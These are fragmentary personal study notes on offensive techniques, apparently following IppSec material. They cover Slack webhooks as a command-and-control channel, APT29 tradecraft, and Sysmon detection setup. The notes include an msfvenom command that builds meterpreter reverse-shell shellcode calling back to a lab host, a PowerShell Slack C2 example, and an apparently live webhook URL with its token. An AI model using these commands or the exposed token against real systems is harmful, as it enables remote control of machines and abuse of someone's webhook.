# looking at ippsec techniques

# setting slack web hooks and C2
make the channel private
webhook integrations
https://hooks.slack.com/services/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

$body = COnvertTo-Json @{
    pretext = "Automated"
    text = "Hi there"
}
Invoke-RestMethod https://hooks.slack.com/services/
B0559PG99FC/Ej96lpmHngg1OV7htEKcfk3n -Method Post -Body $body -ContentType "application/json"

![](message_passed.png)

### using this as a C2

https://3xpl01tc0d3r.blogspot.com/2018/06/how-to-use-slack-as-c2-sever.html

using a slackshell


# analysing APT 29

https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/

APT 29 uses lnk files in a zip format

ippsec.rocks

uses dll injection into microsoft updater

sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.49.144 LPORT=4444 -f bin -o shellcode.bin

we can create one by cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform win -o pleasesubscribe.exe

we can open this up in x64dbg
needs to be done in x64dbg file

# sysmon blocking unwanted files

you cn download sysmon

rule file at Neo23x0/ sysmon-config

windows system 32 and then using sysmon -i sysmon-conifg

custom logs in sysmon is through using task scheduler

and then it can be hooked onto lack but the method no longer works
The format is UTF-16LE

allright so this an be done


